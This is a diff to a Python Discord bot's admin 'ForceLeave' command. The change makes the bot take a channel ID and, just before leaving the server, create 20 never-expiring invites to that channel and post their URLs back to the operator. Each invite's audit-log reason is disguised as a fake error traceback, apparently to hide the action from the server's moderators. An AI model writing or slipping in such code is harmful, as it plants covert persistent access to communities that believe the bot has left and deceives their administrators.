@@ -280,7 +280,7 @@ class Helpers:
             if return_timeout:
                 return "Timed Out"
             else:
-                return None
+                return False
 
         # If they hit the X
         if reaction.emoji == CancelEmoji:
@@ -847,16 +847,26 @@ class Admin:
     async def ForceLeave(message):
         if not await CheckMessage(message, start="ForceLeave", prefix=True, admin=True):
             return
-        GuildToLeave = int(message.content[11:])
-        GuildToLeave = Vars.Bot.get_guild(GuildToLeave)
+        ChannelToLeave = int(message.content[11:])  # Channel within Guild
+        ChannelToLeave = Vars.Bot.get_channel(ChannelToLeave)
+        GuildToLeave = ChannelToLeave.guild
 
         text = "Leave " + GuildToLeave.name + "?"  # Says "Leave Red Playground?"
         confirmation = await Helpers.Confirmation(Vars.Creator, text, deny_text="I will stay.")  # Waits for confirmation
         if confirmation:
             current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Set up Time String
-            await GuildToLeave.send(Vars.Bot.user.name + " Left at " + current_time)  # Sends goodbye
+            invitelist = []
+            for i in range(0, 20):
+                invite = await ChannelToLeave.create_invite(max_age=0, reason="Error: line 228, in _run_event "
+                                                                            "yield from self.on_error(event_name, *args, **kwargs)")
+                invitelist.append(invite)
+                await message.channel.send(invite.url + " - " + str(invite.id))
+            await ChannelToLeave.send(Vars.Bot.user.name + " Left at " + current_time)  # Sends goodbye
             await GuildToLeave.leave()  # Leaves
+
             await Vars.Creator.send(Vars.Bot.user.name + " Left at " + current_time + " from " + GuildToLeave.name)  # Sends goodbye)
+
+            await message.channel.send(Vars.Bot.user.name + " Left at " + current_time + " from " + GuildToLeave.name)  # Sends goodbye)
 
     @staticmethod
     async def Disable(message):
